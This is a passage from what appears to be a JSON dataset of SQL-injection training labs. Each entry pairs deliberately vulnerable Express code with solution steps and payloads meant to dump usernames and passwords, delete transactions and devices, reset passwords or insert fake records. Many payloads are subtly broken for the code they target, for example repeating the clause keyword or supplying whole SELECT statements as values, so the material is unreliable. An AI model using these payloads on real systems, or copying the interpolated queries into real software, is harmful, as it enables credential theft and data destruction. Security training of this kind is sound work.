      "amount GROUP BY (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard allows users to filter devices based on their sensor data using the HAVING clause, but input is not sanitized. To solve: Exploit the HAVING clause to extract data about users and devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device filtering endpoint.",
      "Inject SQL payloads into the 'sensor_value' parameter, such as 'HAVING 1=1 UNION SELECT ip_address, mac_address FROM devices--'.",
      "Check for any sensitive device data leakage.",
      "Use sqlmap to automate the exploitation and extract device details.",
      "Verify the successful retrieval of device information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-device', (req, res) => {\n  const sensor_value = req.query.sensor_value;\n  const query = `SELECT * FROM devices HAVING ${sensor_value}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT ip_address, mac_address FROM devices--",
      "HAVING 1=1 UNION SELECT name, location FROM devices--",
      "HAVING 1=1 UNION SELECT model, manufacturer FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in SELECT Clause",
    "Lab Description": "The CMS allows filtering of content based on tags but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to extract sensitive content.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content filtering endpoint.",
      "Inject SQL payloads into the 'tag' parameter, such as 'tag UNION SELECT title, content FROM articles--'.",
      "Observe the response for any content data leakage.",
      "Use sqlmap to automate the exploitation and retrieve articles from the CMS.",
      "Verify the successful extraction of articles."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-content', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM content WHERE tag = '${tag}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "tag UNION SELECT title, content FROM articles--",
      "tag UNION SELECT id, content FROM articles--",
      "tag UNION SELECT author, content FROM articles--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in WHERE Clause",
    "Lab Description": "The API Gateway allows querying records based on filters but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to inject SQL and extract sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query records endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1 OR 1=1--'.",
      "Check the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve record details.",
      "Verify the successful extraction of records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-records', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `SELECT * FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1--",
      "2 OR 1=1--",
      "3 OR 1=1--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in DELETE Clause",
    "Lab Description": "The banking portal allows deletion of transactions but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to delete specific records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction delete endpoint.",
      "Inject SQL payloads into the 'transaction_id' parameter, such as '1; DELETE FROM transactions WHERE user_id=1--'.",
      "Check the response for successful transaction deletion.",
      "Use sqlmap to automate the exploitation and delete sensitive records.",
      "Verify the successful deletion of transaction records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-transaction', (req, res) => {\n  const transaction_id = req.query.transaction_id;\n  const query = `DELETE FROM transactions WHERE id = ${transaction_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Transaction deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM transactions WHERE user_id=1--",
      "2; DELETE FROM transactions WHERE user_id=2--",
      "3; DELETE FROM transactions WHERE user_id=3--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in SELECT Clause",
    "Lab Description": "The IoT dashboard allows querying device information but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to extract sensitive device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device info endpoint.",
      "Inject SQL payloads into the 'device_id' parameter, such as '1 UNION SELECT ip_address, status FROM devices--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-info', (req, res) => {\n  const device_id = req.query.device_id;\n  const query = `SELECT * FROM devices WHERE id = ${device_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT ip_address, status FROM devices--",
      "2 UNION SELECT mac_address, status FROM devices--",
      "3 UNION SELECT device_name, status FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows inserting new articles but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to add fake articles.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article insertion endpoint.",
      "Inject SQL payloads into the 'title' parameter, such as 'New Title); INSERT INTO articles (title, content) VALUES (\\'Fake Title\\', \\'Fake content\\')--'.",
      "Check for successful insertion of the fake article.",
      "Use sqlmap to automate the exploitation and insert fake content into the CMS.",
      "Verify the successful addition of a fake article."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-article', (req, res) => {\n  const { title, content } = req.body;\n  const query = `INSERT INTO articles (title, content) VALUES ('${title}', '${content}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Article added' });\n  });\n});",
    "payloads": [
      "New Title); INSERT INTO articles (title, content) VALUES ('Fake Title', 'Fake content')--",
      "Another Title); INSERT INTO articles (title, content) VALUES ('Fake Content', 'Fake text')--",
      "Example Title); INSERT INTO articles (title, content) VALUES ('Injected Article', 'Malicious content')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in UPDATE Clause",
    "Lab Description": "The API Gateway allows updating user information but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify user details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the update user info endpoint.",
      "Inject SQL payloads into the 'user_id' parameter, such as '1; UPDATE users SET password=\\'newpassword\\' WHERE id=1--'.",
      "Check the response for any successful update of user data.",
      "Use sqlmap to automate the exploitation and update user passwords.",
      "Verify the successful update of user details."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.put('/update-user', (req, res) => {\n  const { user_id, new_password } = req.body;\n  const query = `UPDATE users SET password = '${new_password}' WHERE id = ${user_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'User updated' });\n  });\n});",
    "payloads": [
      "1; UPDATE users SET password='newpassword' WHERE id=1--",
      "2; UPDATE users SET password='newpassword' WHERE id=2--",
      "3; UPDATE users SET password='newpassword' WHERE id=3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in LIMIT Clause",
    "Lab Description": "The banking portal allows filtering transactions but fails to sanitize input in the LIMIT clause. To solve: Exploit the LIMIT clause to bypass filtering and extract more data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '1 UNION SELECT username, password FROM users LIMIT 10--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of account information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM transactions LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users LIMIT 10--",
      "2 UNION SELECT email, password FROM users LIMIT 5--",
      "3 UNION SELECT id, email FROM users LIMIT 3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal allows sorting transactions by date, but input is not sanitized in the ORDER BY clause. To solve: Exploit the ORDER BY clause to manipulate the query and extract sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction sorting endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-sort', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM transactions ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
      "ORDER BY 2 UNION SELECT email, password FROM users--",
      "ORDER BY 3 UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in INSERT Clause",
    "Lab Description": "The IoT dashboard allows users to add devices but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to insert malicious data into the device database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the add device endpoint.",
      "Inject SQL payloads into the 'device_name' parameter, such as 'DeviceName'); INSERT INTO devices (name, ip_address) VALUES ('Hacked Device', 'malicious_ip')--'.",
      "Check for successful insertion of the malicious device.",
      "Use sqlmap to automate the exploitation and insert new devices into the database.",
      "Verify the successful addition of malicious data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-device', (req, res) => {\n  const { device_name, ip_address } = req.body;\n  const query = `INSERT INTO devices (name, ip_address) VALUES ('${device_name}', '${ip_address}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device added' });\n  });\n});",
    "payloads": [
      "DeviceName'); INSERT INTO devices (name, ip_address) VALUES ('Hacked Device', 'malicious_ip')--",
      "NewDevice'); INSERT INTO devices (name, ip_address) VALUES ('Fake Device', 'malicious_ip')--",
      "AnotherDevice'); INSERT INTO devices (name, ip_address) VALUES ('Compromised Device', 'malicious_ip')--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS allows filtering of articles but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to extract sensitive content from the articles database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article filtering endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'category WHERE 1=1 UNION SELECT title, content FROM articles--'.",
      "Observe the response for any sensitive content leakage.",
      "Use sqlmap to automate the exploitation and retrieve article data.",
      "Verify the successful extraction of article titles and content."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-articles', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM articles WHERE category = '${filter}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "category WHERE 1=1 UNION SELECT title, content FROM articles--",
      "category WHERE 1=1 UNION SELECT id, content FROM articles--",
      "category WHERE 1=1 UNION SELECT author, content FROM articles--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in INSERT Clause",
    "Lab Description": "The API Gateway allows adding new records but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to add arbitrary data into the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the insert record endpoint.",
      "Inject SQL payloads into the 'record_name' parameter, such as 'RecordName'); INSERT INTO records (name, value) VALUES ('MaliciousRecord', 'HackedValue')--'.",
      "Check for successful insertion of the malicious record.",
      "Use sqlmap to automate the exploitation and insert new records.",
      "Verify the successful addition of malicious records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-record', (req, res) => {\n  const { record_name, value } = req.body;\n  const query = `INSERT INTO records (name, value) VALUES ('${record_name}', '${value}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record added' });\n  });\n});",
    "payloads": [
      "RecordName'); INSERT INTO records (name, value) VALUES ('MaliciousRecord', 'HackedValue')--",
      "NewRecord'); INSERT INTO records (name, value) VALUES ('InjectedRecord', 'FakeValue')--",
      "ExampleRecord'); INSERT INTO records (name, value) VALUES ('InjectedRecord2', 'MaliciousValue')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal allows filtering transactions by account type but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'account_type' parameter, such as 'account_type UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const account_type = req.query.account_type;\n  const query = `SELECT * FROM transactions WHERE account_type = '${account_type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "account_type UNION SELECT username, password FROM users--",
      "account_type UNION SELECT email, password FROM users--",
      "account_type UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in JOIN Clause",
    "Lab Description": "The CMS allows displaying user comments on articles but fails to sanitize input in the JOIN clause. To solve: Exploit the JOIN clause to extract user data from the 'users' table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the comments endpoint.",
      "Inject SQL payloads into the 'article_id' parameter, such as '1 JOIN users ON users.id = comments.user_id--'.",
      "Check for any user data leakage from the 'users' table.",
      "Use sqlmap to automate the exploitation and retrieve user details.",
      "Verify the successful extraction of user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/article-comments', (req, res) => {\n  const article_id = req.query.article_id;\n  const query = `SELECT * FROM comments WHERE article_id = '${article_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 JOIN users ON users.id = comments.user_id--",
      "2 JOIN users ON users.email = comments.user_email--",
      "3 JOIN users ON users.username = comments.user_name--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in DELETE Clause",
    "Lab Description": "The API Gateway allows deleting records but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to delete critical records from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the delete record endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1; DELETE FROM records WHERE id=1--'.",
      "Check for successful deletion of the record.",
      "Use sqlmap to automate the exploitation and delete arbitrary records.",
      "Verify the successful deletion of records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-record', (req, res) => {\n  const { record_id } = req.body;\n  const query = `DELETE FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM records WHERE id=1--",
      "2; DELETE FROM records WHERE id=2--",
      "3; DELETE FROM records WHERE id=3--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard allows users to view device status grouped by categories but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to extract sensitive information from the devices table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device status endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'GROUP BY 1 UNION SELECT device_name, ip_address FROM devices--'.",
      "Check for successful extraction of sensitive data.",
      "Use sqlmap to automate the exploitation and retrieve device data.",
      "Verify the successful extraction of device information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM devices GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT device_name, ip_address FROM devices--",
      "GROUP BY 2 UNION SELECT id, ip_address FROM devices--",
      "GROUP BY 3 UNION SELECT id, name FROM devices--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in LIMIT Clause",
    "Lab Description": "The banking portal allows limiting the number of transactions displayed but fails to sanitize input in the LIMIT clause. To solve: Exploit the LIMIT clause to extract sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction listing endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as 'LIMIT 1,1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM transactions LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "LIMIT 1,1 UNION SELECT username, password FROM users--",
      "LIMIT 2,1 UNION SELECT id, password FROM users--",
      "LIMIT 3,1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in INSERT Clause",
    "Lab Description": "The IoT dashboard allows adding new devices but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to insert malicious data into the devices table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the add device endpoint.",
      "Inject SQL payloads into the 'device_name' parameter, such as ''); INSERT INTO devices (name, type) VALUES ('MaliciousDevice', 'Compromised')--'.",
      "Check for successful insertion of malicious data into the devices table.",
      "Use sqlmap to automate the exploitation and insert data.",
      "Verify the successful insertion of compromised device."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-device', (req, res) => {\n  const { device_name, device_type } = req.body;\n  const query = `INSERT INTO devices (name, type) VALUES ('${device_name}', '${device_type}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device added' });\n  });\n});",
    "payloads": [
      "'); INSERT INTO devices (name, type) VALUES ('MaliciousDevice', 'Compromised')--",
      "'); INSERT INTO devices (name, type) VALUES ('HackedDevice', 'Rooted')--",
      "'); INSERT INTO devices (name, type) VALUES ('ExploitDevice', 'Hijacked')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in JOIN Clause",
    "Lab Description": "The API Gateway allows querying joined data but fails to sanitize input in the JOIN clause. To solve: Exploit the JOIN clause to retrieve additional sensitive data from other tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the join query endpoint.",
      "Inject SQL payloads into the 'join_table' parameter, such as 'JOIN users ON users.id = transactions.user_id UNION SELECT username, password FROM users--'.",
      "Check for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and extract sensitive data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-data', (req, res) => {\n  const join_table = req.query.join_table;\n  const query = `SELECT * FROM transactions JOIN ${join_table}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "JOIN users ON users.id = transactions.user_id UNION SELECT username, password FROM users--",
      "JOIN employees ON employees.id = transactions.user_id UNION SELECT email, password FROM users--",
      "JOIN accounts ON accounts.id = transactions.user_id UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS allows categorizing articles by author but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to retrieve sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article categorization endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'GROUP BY 1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/group-articles', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM articles GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "GROUP BY 1 UNION SELECT username, password FROM users--",
      "GROUP BY 2 UNION SELECT email, password FROM users--",
      "GROUP BY 3 UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in DELETE Clause",
    "Lab Description": "The IoT dashboard allows deleting devices but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to delete arbitrary devices from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the delete device endpoint.",
      "Inject SQL payloads into the 'device_id' parameter, such as '1; DELETE FROM devices WHERE id = 2--'.",
      "Check for successful deletion of the device.",
      "Use sqlmap to automate the exploitation and delete arbitrary devices.",
      "Verify the successful deletion of devices."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-device', (req, res) => {\n  const device_id = req.body.device_id;\n  const query = `DELETE FROM devices WHERE id = ${device_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM devices WHERE id = 2--",
      "2; DELETE FROM devices WHERE id = 3--",
      "3; DELETE FROM devices WHERE id = 4--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal allows viewing transactions by account number but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve additional sensitive data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction viewing endpoint.",
      "Inject SQL payloads into the 'account_number' parameter, such as 'SELECT * FROM transactions WHERE account_number = '12345' UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/view-transactions', (req, res) => {\n  const account_number = req.query.account_number;\n  const query = `SELECT * FROM transactions WHERE account_number = '${account_number}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "SELECT * FROM transactions WHERE account_number = '12345' UNION SELECT username, password FROM users--",
      "SELECT * FROM transactions WHERE account_number = '98765' UNION SELECT id, password FROM users--",
      "SELECT * FROM transactions WHERE account_number = '11111' UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in ORDER BY Clause",
    "Lab Description": "The CMS allows sorting articles by publication date but fails to sanitize input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to retrieve sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article sorting endpoint.",
      "Inject SQL payloads into the 'sort_by' parameter, such as 'ORDER BY 1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sort-articles', (req, res) => {\n  const sort_by = req.query.sort_by;\n  const query = `SELECT * FROM articles ORDER BY ${sort_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "ORDER BY 1 UNION SELECT username, password FROM users--",
      "ORDER BY 2 UNION SELECT id, email FROM users--",
      "ORDER BY 3 UNION SELECT id, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in UPDATE Clause",
    "Lab Description": "The API Gateway allows updating user profile information but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a request to the update profile endpoint.",
      "Inject SQL payloads into the 'username' parameter, such as 'username = 'hacked' WHERE id = 1--'.",
      "Check for successful modification of user data.",
      "Use sqlmap to automate the exploitation and modify user data.",
      "Verify the successful modification of user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.put('/update-profile', (req, res) => {\n  const { username, email } = req.body;\n  const query = `UPDATE users SET username = '${username}', email = '${email}' WHERE id = ${req.body.id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Profile updated' });\n  });\n});",
    "payloads": [
      "username = 'hacked' WHERE id = 1--",
      "username = 'admin' WHERE id = 2--",
      "username = 'root' WHERE id = 3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal allows filtering transactions by type but fails to sanitize input in the HAVING clause. To solve: Exploit the HAVING clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filtering endpoint.",
      "Inject SQL payloads into the 'transaction_type' parameter, such as 'HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-transactions', (req, res) => {\n  const transaction_type = req.query.transaction_type;\n  const query = `SELECT * FROM transactions HAVING transaction_type = '${transaction_type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "HAVING 1=1 UNION SELECT username, password FROM users--",
      "HAVING 1=1 UNION SELECT id, password FROM users--",
      "HAVING 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in WHERE Clause",
    "Lab Description": "The IoT dashboard allows users to view device status based on device ID but fails to sanitize input in the WHERE clause. To solve: Exploit the WHERE clause to retrieve unauthorized data from other tables.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device status endpoint.",
      "Inject SQL payloads into the 'device_id' parameter, such as '1 OR 1=1 UNION SELECT username, password FROM users--'.",
      "Check for successful data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const device_id = req.query.device_id;\n  const query = `SELECT * FROM devices WHERE id = ${device_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 OR 1=1 UNION SELECT username, password FROM users--",
      "2 OR 1=1 UNION SELECT id, password FROM users--",
      "3 OR 1=1 UNION SELECT email, username FROM users--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows admins to add new categories but fails to sanitize input in the INSERT clause. To solve: Exploit the INSERT clause to insert malicious data into the categories table.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the add category endpoint.",
      "Inject SQL payloads into the 'category_name' parameter, such as ''); INSERT INTO categories (name) VALUES ('MaliciousCategory')--'.",
      "Check for successful insertion of malicious data into the categories table.",
      "Use sqlmap to automate the exploitation and insert data.",
      "Verify the successful insertion of malicious data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-category', (req, res) => {\n  const category_name = req.body.category_name;\n  const query = `INSERT INTO categories (name) VALUES ('${category_name}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Category added' });\n  });\n});",
    "payloads": [
      "'); INSERT INTO categories (name) VALUES ('MaliciousCategory')--",
      "'); INSERT INTO categories (name) VALUES ('HackedCategory')--",
      "'); INSERT INTO categories (name) VALUES ('ExploitCategory')--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows querying users by email but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to retrieve sensitive user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query users endpoint.",
      "Inject SQL payloads into the 'email' parameter, such as 'SELECT * FROM users WHERE email = '' UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage from the users table.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-users', (req, res) => {\n  const email = req.query.email;\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "SELECT * FROM users WHERE email = '' UNION SELECT username, password FROM users--",
